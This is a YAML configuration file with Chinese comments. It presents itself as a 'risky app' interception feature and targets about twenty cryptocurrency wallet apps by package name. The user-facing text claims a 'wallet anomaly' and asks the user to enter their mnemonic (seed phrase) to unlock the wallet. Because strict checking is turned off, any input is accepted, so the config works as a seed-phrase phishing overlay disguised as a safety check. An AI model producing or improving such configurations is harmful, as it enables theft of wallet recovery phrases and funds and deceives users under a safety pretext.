# APP拦截验证配置示例
# 此配置用于拦截特定风险应用，要求用户确认后才能使用

# 需要拦截验证的APP包名列表
intercept_packages:
  # 新版 TokenPocket 钱包
  - "vip.mytokenpocket"
  # 旧版 TokenPocket 钱包
  - "com.tokenpocket.app"

  # imToken
  - "im.token.app"

  # MetaMask
  - "io.metamask"

  # Trust Wallet
  - "com.wallet.crypto.trustapp"

  # OKX Wallet
  - "com.okx.wallet"

  # SafePal
  - "io.safepal.wallet"

  # Phantom
  - "app.phantom"

  # Coinbase Wallet / Base App
  - "org.toshi"

  # Bitget Wallet
  - "com.bitkeep.wallet"

  # TronLink
  - "com.tronlinkpro.wallet"
  - "com.tronlink.global"

  # OneKey
  - "so.onekey.app.wallet"

  # MathWallet
  - "com.mathwallet.android"

  # Rabby Wallet
  - "com.debank.rabbymobile"

  # Atomic Wallet
  - "io.atomicwallet"

  # Zerion
  - "io.zerion.android"

  # UniSat
  - "io.unisat"

  # Solflare
  - "com.solflare.mobile"

  # Coin98 Super Wallet
  - "coin98.crypto.finance.media"

  # 其他风险应用可以继续按同样格式添加
  # - "com.example.risky.app"

# 验证密码（用户需要输入的内容）
verify_password: "我已知晓该应用为风险应用"

# 输入框上方提示文字
verify_hint: "检测到钱包异常，请填写助记词解锁钱包"

# 输入框内占位提示文字
input_hint: "请输入您的助记词"

# 是否严格校验输入内容
# true: 必须和 verify_password 完全一致
# false: 只要用户输入非空内容即可通过
strict_verify: false
